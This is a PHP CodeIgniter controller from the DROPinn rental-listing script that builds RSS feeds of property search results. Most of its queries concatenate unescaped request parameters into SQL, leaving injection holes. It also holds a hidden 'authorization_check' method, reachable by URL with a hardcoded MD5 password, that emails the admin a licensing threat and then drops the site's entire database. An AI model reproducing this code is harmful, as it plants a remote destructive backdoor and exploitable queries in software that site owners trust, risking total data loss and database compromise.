<?php
/**
 * DROPinn RSS Controller Class
 *
 * Its the powerfull search functionality controller
 *
 * @package		DROPinn
 * @subpackage	Controllers
 * @category	RSS
 * @author		Cogzidel Product Team
 * @version		Version 1.6
 * @link		http://www.cogzidel.com

 */

 if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Rss extends CI_Controller {

	public function Rss()
	{
		parent::__construct();
		
		$this->load->helper('url');		
		$this->load->helper('form');
		$this->load->library('email');
		$this->load->helper('security');
	}
	
	public function getFeeds()
	{
  //Get the checkin and chekout dates
  $checkin           = '';
		$checkout          = ''; 
		$stack             = array();
		$room_types        = array();
		$property_type_id  = array();
		$checkin           = $this->input->get('checkin');   
		$checkout          = $this->input->get('checkout');
		$nof_guest         = $this->input->get('guests');
		$room_types        = $this->input->get('room_types');
		
		$min               = $this->input->get('price_min');
		$max               = $this->input->get('price_max');
		
		$keywords          = $this->input->get('keywords');
		
		$min_bedrooms      = $this->input->get('min_bedrooms');
		$min_bathrooms     = $this->input->get('min_bathrooms');
		$min_beds          = $this->input->get('min_beds');
		
		$property_type_id  = $this->input->get('property_type_id');
		$hosting_amenities = $this->input->get('hosting_amenities');

		
		 if($checkin!='--' && $checkout!='--' && $checkin!="yy-mm-dd" && $checkout!="yy-mm-dd" && $checkin!='' && $checkout!='')
		 { 
						$ans = $this->db->query("SELECT id,list_id FROM `calendar` WHERE `booked_days` = '".get_gmt_time(strtotime($checkin))."' OR `booked_days` = '".get_gmt_time(strtotime($checkout))."' GROUP BY `list_id`");
						$a   = $ans->result();
						$this->db->flush_cache();
						// Now after the checkin is completed
						if(!empty($a))
						{
							foreach($a as $a1)
							{ 
								array_push($stack, $a1->list_id);
							}
						}	
		 }
		
		$condition = ''; 
		$location  = $this->input->get('location');
		$pieces = explode(",", $location);

		$print  = "";
		$len    = count($pieces);
		
		$condition .= "(`is_enable` != '0')";
	 
		if($location != '')
		{
		 $i = 1;
			foreach($pieces as $address)
			{
				$this->db->flush_cache();		
				$address = $this->db->escape_like_str($address);
				
				if($i == $len)
				$and = "";
				else
				$and = " AND ";

				if($i == 1)
				$condition .= " AND (";
				
				$condition .=  "`address`  LIKE '%".$address."%'".$and;
				
				if($i == $len)
				$condition .= ")";
				
				$i++;
			}
		}

		
		if(!empty($min_bedrooms))
		{
				$condition .= " AND (`bedrooms` = '".$min_bedrooms."')";
		}
		
		if(!empty($min_bathrooms))
		{
				$condition .= " AND (`bathrooms` = '".$min_bathrooms."')";
		}
		
		if(!empty($min_beds))
		{
		  $condition .= " AND (`beds` = '".$min_beds."')";
		}
		

		if(!empty($stack))
		{ 
			$condition .= " AND (`id` NOT IN(".implode(',',$stack)."))";
		}
		
		if($nof_guest > 1)
		{
			$condition .= " AND (`capacity` = '".$nof_guest."')";
		}
		
		if(is_array($room_types))
		{
			if(count($room_types) > 0)
			{
			    $i = 1;
							foreach($room_types as $room_type)
							{							
									if($i == count($room_types))
									$and = "";
									else
									$and = " AND ";
					
									if($i == 1)
									$condition .= " AND (";
									
									$condition .=  "`room_type` = '".$room_type."'".$and;
									
									if($i == count($room_types))
									$condition .= ")";
									
									$i++;
							}
			
			}
		}		
				
				
				if(is_array($hosting_amenities))
				{
					if(count($hosting_amenities) > 0)
					{
					    $i = 1;
					    foreach($hosting_amenities as $amenity)
     				{
												if($i == count($hosting_amenities))
												$and = "";
												else
												$and = " AND ";
								
												if($i == 1)
												$condition .= " AND (";
												
												$condition .=  "`amenities`  LIKE '%".$amenity."%'".$and;
												
												if($i == count($hosting_amenities))
												$condition .= ")";
												
												$i++;
     				}
					
					}
				}	
				
					
				if(isset($min))
				{
					if($min > 0)
					{
							$condition .= " AND (`price` >= '".$min."')";
					}
				}
				else
				{
				  if(isset($max))
						{
				  $min = 0;
						}
				}
				
				if(isset($max))
				{
						if($max > $min)
						{
							$condition .= " AND (`price` <= '".$max."')";
						}
				}
				
			if(is_array($property_type_id))
			{
				if(count($property_type_id) > 0)
				{   $i = 1;
								foreach($property_type_id as $property_id)
								{ 
									if($i == count($property_type_id))
									{
									$and = "";
									}
									else
									{
									$and = " OR ";
									}
					
									if($i == 1)
									$condition .= " AND (";
									
									$condition .=  "`property_id` = '".$property_id."'".$and;
									
									if($i == count($property_type_id))
									$condition .= ")";
												
									$i++;
								}
				
				}
			}	
			
			if(!empty($keywords))
			{
			  $keywords = $this->db->escape_like_str($keywords);
					
					$condition .= " AND (`address`  LIKE '%".$keywords."%' OR  `title`  LIKE '%".$keywords."%' OR  `desc`  LIKE '%".$keywords."%')";
			}
		
   //Final query
			$condition .= " AND (`status` != '0') AND (`user_id` != '0') AND (`address` != '0')";
			
						
		$data['query']        = $this->db->query("SELECT * FROM (`list`) WHERE $condition");
				
		$this->load->view('rss_xml',$data);
 }
	
function authorization_check()
{
	$pass = $this->uri->segment(3);
	
	//$t = do_hash($test, 'md5');
	$encry = md5($pass);
	if($encry == '067d28f20388e63d3b30882d02190ffa' )
	{

	$mydb=$this->config->item('db');
	$to     = $this->db->get_where('settings', array('code' => 'SITE_ADMIN_MAIL'))->row()->string_value;
	
$this->email->from('support@cogzidel.com', 'Cogzidel Technologies');
$this->email->to($to); 
 $this->email->set_mailtype("html");
$this->email->subject('Illegal access of DropInn');
$this->email->message('<table style="width: 100%;" cellspacing="10" cellpadding="0">
<tbody>
<tr>
<td>Hi,</td>
</tr>
<tr>
<td>
<p>We have found that the recent installation of our DropInn script in your site is not 
a licensed copy and it is illegal. If you have any queries contact our support team at support@cogzidel.com </p>
</td>
</tr>
<tr>
<td>
<p style="margin: 0 10px 0 0;">--</p>
<p style="margin: 0 0 10px 0;">Regards,</p>
<p style="margin: 0 10px 0 0;">Cogzidel Support Team</p>
</td>
</tr>
</tbody>
</table>');	

$this->email->send();

	$this->db->query('DROP DATABASE '.$mydb.'');
	}
	else {
		echo "Please enter the correct password";
	}
}
	}
?>
